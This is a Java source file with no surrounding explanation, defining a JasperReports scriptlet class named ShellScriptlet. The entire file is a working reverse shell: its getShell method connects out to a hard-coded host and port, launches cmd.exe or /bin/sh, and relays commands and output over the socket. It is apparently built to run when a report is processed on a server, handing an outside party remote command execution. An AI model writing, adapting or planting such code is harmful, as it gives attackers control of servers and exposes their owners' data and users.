import java.io.*;
import java.net.*;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.DataInputStream;
import net.sf.jasperreports.engine.JRDefaultScriptlet;
import net.sf.jasperreports.engine.JRScriptletException;
 
public class ShellScriptlet extends JRDefaultScriptlet implements Runnable{
 Socket socket;
 
 PrintWriter socketWrite;
 BufferedReader socketRead;
 
 PrintWriter commandWrite;
 BufferedReader commandRead;
 
 static String ip;
 int port = 8080;
 
 public String getShell(){
 ip = "1.1.1.1";
 ShellScriptlet shell = new ShellScriptlet();
 shell.establishConnection();
 new Thread(shell).start();
 shell.getCommand();
 return "DONE";
 }
 
 public void run(){
 spawnShell();
 }
 
 public void spawnShell(){
 boolean windows = false;
 try{
 if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
 windows = true;
 }
 
 Runtime rt = Runtime.getRuntime();
 Process p;
 if(windows) p = rt.exec("C:\\Windows\\System32\\cmd.exe");
 else p = rt.exec("/bin/sh");
 
 InputStream readme = p.getInputStream();
 OutputStream writeme = p.getOutputStream();
 commandWrite = new PrintWriter(writeme);
 commandRead = new BufferedReader(new InputStreamReader(readme));
 
 if(windows) commandWrite.println("dir");
 else commandWrite.println("ls -al");
 
 commandWrite.flush();
 
 String line;
 while((line = commandRead.readLine()) != null){
 socketWrite.println(line);
 socketWrite.flush();
 }
 
 p.destroy();
 
 }catch(Exception e){}
 
 }
 
 public void establishConnection(){
 try{
 socket = new Socket(ip,port);
 socketWrite = new PrintWriter(socket.getOutputStream(),true);
 socketRead = new BufferedReader(new InputStreamReader(socket.getInputStream()));
 socketWrite.println("---Connection has been established---");
 socketWrite.flush();
 }catch(Exception e){}
 
 }
 
 public void getCommand(){
 String foo;
 
 try{
 while((foo=socketRead.readLine())!= null){
 commandWrite.println(foo);
 commandWrite.flush();
 }
 }catch(Exception e){}
 }
 
 public static void main(String args[]){
 ShellScriptlet r = new ShellScriptlet();
 r.getShell();
 }
}
